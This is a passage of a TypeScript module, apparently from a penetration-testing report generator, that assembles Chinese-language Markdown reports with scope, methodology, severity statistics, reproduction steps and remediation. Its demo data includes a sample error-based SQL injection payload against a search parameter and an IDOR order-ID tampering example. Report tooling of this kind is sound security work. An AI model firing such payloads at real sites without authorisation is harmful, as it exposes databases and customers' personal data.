      `${input.client || "客户"}委托${input.company}对「${input.taskLabel || "授权目标"}」开展渗透测试，目标是验证安全缺陷在真实环境中的可利用性，并形成工程团队可直接复现、可据以修复的证据。`,
      `本次测试覆盖授权范围内的业务系统与接口，采用人工验证与工具辅助相结合的方式；每个结论均保留了原始请求/响应或等价复现报文${tw ? "，" : "，"}确保报告可复核、可追溯。`,
    ],
    service_result: `本次共确认 ${total} 个漏洞${parts.length ? `（${parts.join("、")}）` : ""}。每个漏洞均包含影响资产、CVSS 评分、分步复现过程与修复建议。`,
    remediation_conclusion: tw
      ? "首輪測試發現的漏洞目前均處於待修復狀態，建議儘快整改，並在修復後安排複測以確認漏洞閉環。"
      : "首轮测试发现的漏洞目前均处于待修复状态，建议尽快整改，并在修复后安排复测以确认漏洞闭环。",
    checklist_hits: hits,
  };
}

export function buildReportSnapshot(input: {
  title: string;
  client: string;
  locale: ReportLocale;
  taskLabel: string;
  taskDescription: string;
  settings: ReportSettings;
  findings: ReportFindingSnapshot[];
  generatedAt?: string;
}): ReportSnapshot {
  const stats: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const finding of input.findings) stats[finding.severity] += 1;
  const skeleton = skeletonFor(input.locale);
  const narrative = buildNarrative({
    locale: input.locale,
    client: input.client,
    company: input.settings.company_name,
    taskLabel: input.taskLabel,
    findings: input.findings,
    stats,
  });
  return {
    title: input.title,
    client: input.client,
    locale: input.locale,
    company_name: input.settings.company_name,
    company_name_en: input.settings.company_name_en,
    logo_path: input.settings.logo_path,
    personnel: input.settings.personnel,
    cvss_version: input.settings.cvss_version,
    generated_at: input.generatedAt ?? new Date().toISOString(),
    task_label: input.taskLabel,
    scope: [input.taskDescription].filter(Boolean),
    methodology: skeleton.methodology,
    tools: skeleton.tools,
    standards: skeleton.standards,
    checklist_hits: narrative.checklist_hits,
    background: narrative.background,
    service_result: narrative.service_result,
    remediation_conclusion: narrative.remediation_conclusion,
    findings: input.findings,
    stats,
  };
}

const SEVERITY_LABEL: Record<Severity, string> = {
  critical: "严重",
  high: "高危",
  medium: "中危",
  low: "低危",
};

export function severityLabel(severity: Severity): string {
  return SEVERITY_LABEL[severity];
}

function fmtDate(iso: string): string {
  return new Date(iso).toLocaleDateString("zh-CN", { year: "numeric", month: "2-digit", day: "2-digit" });
}

/** 生成可直接交付/粘贴的 Markdown 报告。 */
export function buildReportMarkdown(snapshot: ReportSnapshot): string {
  const lines: string[] = [];
  lines.push(`# ${snapshot.title}`, "");
  lines.push(`- 客户：${snapshot.client || "—"}`);
  lines.push(`- 出具方：${snapshot.company_name || "—"}`);
  lines.push(`- 测试任务：${snapshot.task_label || "—"}`);
  lines.push(`- 报告日期：${fmtDate(snapshot.generated_at)}`);
  if (snapshot.personnel.length > 0) {
    lines.push(`- 项目成员：${snapshot.personnel.map((p) => `${p.name}（${p.role}）`).join("、")}`);
  }
  lines.push("");
  lines.push("## 项目概述", "");
  for (const paragraph of snapshot.background) lines.push(paragraph, "");
  if (snapshot.scope.length > 0) {
    lines.push("## 测试范围", "");
    for (const item of snapshot.scope) lines.push(`- ${item}`);
    lines.push("");
  }
  lines.push("## 测试流程与方法", "");
  lines.push(snapshot.methodology.intro, "");
  snapshot.methodology.phases.forEach((phase, i) => {
    lines.push(`${i + 1}. **${phase.name}**：${phase.desc}`);
  });
  lines.push("");
  if (snapshot.personnel.length > 0) {
    lines.push("## 测试人员", "");
    lines.push("| 姓名 | 角色 | 联系方式 |");
    lines.push("| --- | --- | --- |");
    for (const person of snapshot.personnel) {
      lines.push(`| ${person.name} | ${person.role} | ${person.contact || "—"} |`);
    }
    lines.push("");
  }
  if (snapshot.tools.length > 0) {
    lines.push("## 测试工具", "");
    for (const tool of snapshot.tools) lines.push(`- **${tool.name}**：${tool.desc}`);
    lines.push("");
  }
  if (snapshot.standards.length > 0) {
    lines.push("## 参考规范", "");
    for (const standard of snapshot.standards) lines.push(`- ${standard}`);
    lines.push("");
  }
  lines.push("## 风险总览", "");
  lines.push(`服务成果：${snapshot.service_result}`, "");
  lines.push("| 严重程度 | 数量 |");
  lines.push("| --- | --- |");
  for (const severity of ["critical", "high", "medium", "low"] as Severity[]) {
    lines.push(`| ${SEVERITY_LABEL[severity]} | ${snapshot.stats[severity]} |`);
  }
  lines.push("");
  if (snapshot.checklist_hits.length > 0) {
    lines.push("## 测试清单命中项", "");
    lines.push("| 测试项 | 结论 |");
    lines.push("| --- | --- |");
    for (const item of snapshot.checklist_hits) lines.push(`| ${item} | 不通过 |`);
    lines.push("");
  }
  lines.push("## 漏洞详情", "");
  snapshot.findings.forEach((finding, index) => {
    lines.push(`### ${index + 1}. ${finding.name}`, "");
    lines.push("| 项目 | 内容 |");
    lines.push("| --- | --- |");
    lines.push(`| 漏洞编号 | ${finding.id} |`);
    lines.push(`| 风险等级 | ${SEVERITY_LABEL[finding.severity]} |`);
    lines.push(`| CVSS | ${finding.cvss_score.toFixed(1)} ${finding.cvss_vector} |`);
    lines.push(`| 影响资产 | ${finding.target} |`);
    lines.push(`| 当前状态 | ${finding.status} |`);
    lines.push("");
    if (finding.description.length) {
      lines.push("**漏洞描述**", "");
      for (const p of finding.description) lines.push(p, "");
    }
    if (finding.risk_analysis.length) {
      lines.push("**影响分析**", "");
      finding.risk_analysis.forEach((item, i) => {
        lines.push(`${i + 1}. ${item}`);
      });
      lines.push("");
    }
    const repro = finding.reproduction;
    if (repro.steps.length || repro.entry_point) {
      lines.push("**复现过程**", "");
      if (repro.entry_point) lines.push(`- 入口点：\`${repro.entry_point}\``);
      if (repro.prerequisites?.length) lines.push(`- 前置条件：${repro.prerequisites.join("；")}`);
      lines.push("");
      repro.steps.forEach((step, i) => {
        const replayTag = step.replay_id ? `（重放记录 #${step.replay_id}）` : "";
        lines.push(`**步骤 ${i + 1}**${step.expected ? `：${step.expected}` : ""}${replayTag}`, "");
        if (step.proves) lines.push(`> 证明：${step.proves}`, "");
        if (step.request.trim()) {
          lines.push("```http", normalizeBurpRequest(step.request), "```", "");
        }
        if (step.response.trim()) {
          lines.push("响应：", "", "```http", normalizeBurpResponse(step.response), "```", "");
        }
      });
    }
    if (finding.remediation.length) {
      lines.push("**修复建议**", "");
      finding.remediation.forEach((item, i) => {
        lines.push(`${i + 1}. ${item}`);
      });
      lines.push("");
    }
    lines.push("---", "");
  });
  lines.push("## 整改结论", "");
  lines.push(snapshot.remediation_conclusion, "");
  lines.push("## 附录", "");
  lines.push("- 本报告基于授权范围内的自动化与人工验证结果整理。");
  lines.push("- 复现步骤中的请求/响应均来自测试期间的原始流量记录或等价复现报文。");
  lines.push(`- CVSS 版本：${snapshot.cvss_version}。`);
  return lines.join("\n");
}

export function reportFilename(snapshot: ReportSnapshot): string {
  const safe = snapshot.title.replace(/[\\/:*?"<>|\s]+/g, "_").slice(0, 80);
  return `${safe}.md`;
}

export function snapshotSize(snapshot: ReportSnapshot): number {
  return new Blob([buildReportMarkdown(snapshot)]).size;
}

// ── 示例报告（首屏演示用） ───────────────────────────────────────────────────

export function demoReportSnapshot(): ReportSnapshot {
  const settings: ReportSettings = {
    company_name: "ARTEX 安全服务团队",
    company_name_en: "ARTEX Security Services",
    logo_path: "",
    personnel: [
      { name: "张工", role: "渗透测试工程师", contact: "zhang@artex.example" },
      { name: "李工", role: "项目负责人", contact: "li@artex.example" },
    ],
    cvss_version: "3.1",
  };
  const findings: ReportFindingSnapshot[] = [
    {
      id: "f-1",
      name: "官网搜索接口报错型 SQL 注入",
      severity: "high",
      status: "confirmed",
      target: "www.acme.com/search",
      cvss_score: 9.1,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
      description: ["www.acme.com/search 的 q 参数存在报错型 SQL 注入（MSSQL），可读取数据库结构与业务数据。"],
      risk_analysis: ["可读取 acme_prod 库的表结构与用户/订单数据。", "报错回显便于快速构造利用，风险高。"],
      remediation: ["全部改用参数化查询。", "关闭生产环境详细报错回显。"],
      reproduction: REPRO_SEEDS["f-1"],
      evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错。",
      traffic_count: 1,
    },
    {
      id: "f-2",
      name: "订单接口 IDOR 越权读取",
      severity: "high",
      status: "confirmed",
      target: "api.acme.com/v1/orders",
      cvss_score: 7.5,
      cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
      description: ["api.acme.com/v1/orders 仅按 id 查询订单，未校验订单归属。"],
      risk_analysis: ["普通用户可读取任意订单的收货地址与手机号。", "可被批量遍历，造成大规模数据泄露。"],
      remediation: ["服务端对订单执行对象级授权校验。", "统一资源访问控制并补充越权测试用例。"],
      reproduction: REPRO_SEEDS["f-2"],
      evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号）。",
      traffic_count: 2,
    },
  ];
  return buildReportSnapshot({
    generatedAt: "2026-11-18T10:00:00.000Z",
    title: "Acme 官网与 API 外部渗透测试报告",
    client: "Acme 科技有限公司",
    locale: "zh-CN",
    taskLabel: "Acme 官网与后台外部渗透",
    taskDescription: "acme.com 主站、后台、API 与边界服务（授权范围）",
    settings,
    findings,
  });
}

/** 浏览器端保存文本文件（Markdown 交付稿）。 */
export function saveTextFile(filename: string, content: string, mime = "text/markdown;charset=utf-8") {
  if (typeof document === "undefined") return;
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement("a");
  anchor.href = url;
  anchor.download = filename;
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}

/** 单个漏洞的 Markdown 交付片段（复制到工单/IM/报告草稿）。 */
export function buildFindingMarkdown(
  finding: Finding,
  enrichment: DeliveryEnrichment,
  reproduction: Reproduction,
): string {
  const lines: string[] = [`# ${enrichment.name}`, ""];
  lines.push(`- 编号：${finding.id}`);
  lines.push(`- 等级：${SEVERITY_LABEL[finding.severity]}`);
  lines.push(`- 资产：${enrichment.target}`);
  lines.push(`- CVSS：${enrichment.cvss_score.toFixed(1)} ${enrichment.cvss_vector}`);
  lines.push("");
  if (enrichment.description.length) {
    lines.push("## 漏洞描述", "");
    for (const p of enrichment.description) lines.push(p, "");
  }
  if (enrichment.risk_analysis.length) {
    lines.push("## 影响分析", "");
    enrichment.risk_analysis.forEach((item, i) => {
      lines.push(`${i + 1}. ${item}`);
    });
    lines.push("");
  }
  if (reproduction.steps.length || reproduction.entry_point) {
    lines.push("## 复现过程", "");
    if (reproduction.entry_point) lines.push(`- 入口点：\`${reproduction.entry_point}\``);
    if (reproduction.prerequisites?.length) lines.push(`- 前置条件：${reproduction.prerequisites.join("；")}`);
    lines.push("");
    reproduction.steps.forEach((step, i) => {
      const replayTag = step.replay_id ? `（重放记录 #${step.replay_id}）` : "";
      lines.push(`**步骤 ${i + 1}**${step.expected ? `：${step.expected}` : ""}${replayTag}`, "");
      if (step.proves) lines.push(`> 证明：${step.proves}`, "");
      if (step.request.trim()) lines.push("```http", normalizeBurpRequest(step.request), "```", "");
      if (step.response.trim()) lines.push("响应：", "", "```http", normalizeBurpResponse(step.response), "```", "");
    });
  }
  if (enrichment.remediation.length) {
    lines.push("## 修复建议", "");
    enrichment.remediation.forEach((item, i) => {
      lines.push(`${i + 1}. ${item}`);
    });
  }
  return lines.join("\n");
}
